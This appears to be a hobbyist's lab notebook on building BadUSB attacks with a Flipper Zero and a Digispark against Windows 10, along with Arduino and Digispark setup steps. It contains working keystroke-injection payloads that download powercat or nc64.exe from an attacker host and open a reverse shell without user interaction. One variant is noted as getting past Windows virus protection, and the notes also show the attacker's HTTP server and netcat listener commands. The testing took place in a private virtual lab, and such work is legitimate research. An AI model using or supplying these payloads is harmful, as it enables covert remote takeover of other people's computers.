### 19.9.2023:
Demo for Reverse Shell done.   
[Demo](../../payloads/revshell_demo)   
[Demo in action](https://youtu.be/h5MMKu6TMxg)   

### 26.9.2023

Today i started to figure out a way to get a reverse shell in Windows 10, without user interaction.

**Sources i used for this experiment:**   

**Powershell/Windows Reverse Shells:**   
https://www.hackingarticles.in/powershell-for-pentester-windows-reverse-shell/  
https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows  
https://github.com/martinsohn/PowerShell-reverse-shell  
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell  

**Downloading files with Powershell:**   
https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl  

**Rubber Ducky scripts:**   
https://gist.github.com/methanoliver/efebfe8f4008e167417d4ab96e5e3cac  

**BadUSB (and reverse shell) using Flipper Zero:**   
https://hackernoon.com/how-to-get-a-reverse-shell-on-macos-using-a-flipper-zero-as-a-badusb  
https://github.com/UNC0V3R3D/Flipper_Zero-BadUsb/blob/main/BadUsb-Collection/Windows_Badusb/FUN/FakeBluescreen/FakeBluescreen.txt  

Used Flipper Zero BadUSB, as the Digispark havent arrived yet, and the code itself should be compatible, or atleast easily converted to work with Digispark.   

Testing Setup:
Virtual Machines:
- Kali Linux
- Windows 10
Both are assigned to same internal network, for testing purposes.
Windows running with default protection settings On.

Flipper Zero, passthrough from Host to virtual Windows 10 machine.

Testing:   
A simplest example, combined from several other ready made scripts:
```bash
REM Description: BadUSB Reverse Shell
DELAY 500
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 400
STRING powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.66.2/powercat.ps1');powercat -c 192.168.66.2 -p 9001 -e cmd"
DELAY 400
ENTER
```

Need webserver (serving the powercat.ps1 script)   

Example from attacker machine:   
```bash
┌──(kali🥦kali)-[~/testing]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

And listener, in the attacker machine (where the shell will be opened):   
```bash
┌──(kali🥦kali)-[~]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
```

This works, BUT Windows - Virus Protection blocks it.

Temporary resolution:   
```bash
REM Description: BadUSB Reverse Shell
DELAY 500
GUI r
DELAY 400
STRING powershell
ENTER
DELAY 400
STRING Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe
DELAY 400
ENTER
DELAY 400
GUI r
DELAY 400
STRING cmd
ENTER
DELAY 400
STRING start /min nc64.exe 192.168.66.2 9001 -e powershell
DELAY 400
ENTER
```

So the attacker serves the nc64.exe (netcat).   
Victim downloads it, and while running it, it calls to the attacker and opens an interactive shell, all automatically when payload executed.

**Test successfull!**

TODO:
- Close Powershell.
- Hide cmd

= Run everything in the background   

[Demo in action:](https://youtu.be/1kqqIdBoKr0?si=59A7y56YvNoeQ5JB)

### 29.9.2023

So the Digisparks arrived!    
Lets get ready to rumbubummbbbmububleleelelee!

**Setting up the environment.**   
I follow this guide for Linux Mint, pretty strictly, as it had photos and stuff:   
https://startingelectronics.org/tutorials/arduino/digispark/digispark-linux-setup/

First thing to do was to get a Arduino IDE:

Im using:
```bash
~$ cat /etc/os-release 
PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"
NAME="Debian GNU/Linux"
VERSION_ID="12"
VERSION="12 (bookworm)"
VERSION_CODENAME=bookworm
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
~$ uname -a 
Linux parasite 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64 GNU/Linux
~$ 
```

So i downloaded the Linux .zip from here:   
https://www.arduino.cc/en/software

After downloading and extracting the content, i threw the folder to my special place, and linked the executable `arduino-ide` from the folder to another folder included in PATH.   
(So its easy to run from everywhere)    

Digispark itself, was identified by system:
```bash
Bus 001 Device 110: ID 16d0:0753 MCS Digistump DigiSpark
```

Tackling few minor problems/issues when uploading stuff to Digispark:   
https://github.com/micronucleus/micronucleus/issues/170   
http://digistump.com/board/index.php?topic=106.0   
digistump.com/wiki/digispark/tutorials/linuxtroubleshooting   
http://digistump.com/board/index.php/topic,1834.msg13109.html#msg13109   

Had to also install:    
`libusb-dev`    

Needed udev rules:
```bash
┌──(sicki🥦parasite)-[~]
└─$ cat /etc/udev/rules.d/49-micronucleus.rules 
SUBSYSTEMS=="usb", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666"
KERNEL=="ttyACM*", ATTRS{idVendor}=="16d0", ATTRS{idProduct}=="0753", MODE:="0666", ENV{ID_MM_DEVICE_IGNORE}="1"   
```

Applied the rules:
```bash
┌──(sicki🥦parasite)-[~]
└─$ sudo udevadm control --reload-rules && sudo udevadm trigger

```

Build the micronucleus and copied it under arduino tools

```bash
~/Projects$ git clone https://github.com/micronucleus/micronucleus.git
~/Projects$ cd micronucleus/commandline/
~/Projects/micronucleus/commandline$ make
Building library: library/micronucleus_lib.c...
gcc  -Ilibrary -O -g -D LINUX -c library/micronucleus_lib.c
Building library: library/littleWire_util.c...
gcc  -Ilibrary -O -g -D LINUX -c library/littleWire_util.c
Building command line tool: micronucleus...
gcc  -Ilibrary -O -g -D LINUX -o micronucleus micronucleus.c micronucleus_lib.o littleWire_util.o -static -L/usr/lib/x86_64-linux-gnu -lusb
rm -f *.o
~/Projects/micronucleus/commandline$ ls
49-micronucleus.rules  library   micronucleus    Readme
builds                 Makefile  micronucleus.c
~/Projects/micronucleus/commandline$ cp micronucleus ~/.arduino15/packages/digistump/tools/micronucleus/2.0a4/
```

So now i had an environment ready for development.   


**Digispark stuff**

I started with a simple Hello World and uploaded it to Digispark:   

![[notes_res/notes-.png]]

That one didnt quite work. Found from the cheatsheet, that the keystrokes must be put, from right to left. Also the enter button got "stuck" so had to escape it with "0"   

Fixed, uploaded, plug in/out:

![[notes_res/notes- 1.png]]

**Worked like a charm**

So the Digispark, when plugged, goes in to some "programmable" mode, for X amount of seconds, and after that it goes in to "execute" mode.    
In that programmable mode, it looks like this:   
```bash
Bus 001 Device 059: ID 16d0:0753 MCS Digistump DigiSpark
```
So in order to upload, i had to first press upload in IDE, and then plug it in. And if not plugged out after upload, it executed the code.   
I searched that it uses the first seconds to load the bootloader and after that it executes whats uploaded.   

In execute mode, the ID changes:   
```bash
Bus 001 Device 060: ID 16c0:27db Van Ooijen Technische Informatica Keyboard
```

So, when wanting to program it in my Host, and executing the payloads in my virtual machine, i had to add the right device to my virtual machine's usb filters:
![[notes_res/notes- 2.png]]


Easiest way to do this, if not wanting to manually input all the fields:   
Write a simple payload, with lots of delay.    
For example:   
```ino
#include "DigiKeyboard.h"

void setup() {

}

void loop() {

DigiKeyboard.delay(10000);

}
```
Upload and let it run.   
While its running the delay, go to virtual machine's USB settings and use the "Add filter with all the fields, set to default..."

As in the picture, there can be seen both:  
- Programming mode
- Execute mode   
And only the execute mode is captured by virtual machine.   
**Profit**.

**TODO:**
- Reverse shell script from BadUSB to Digispark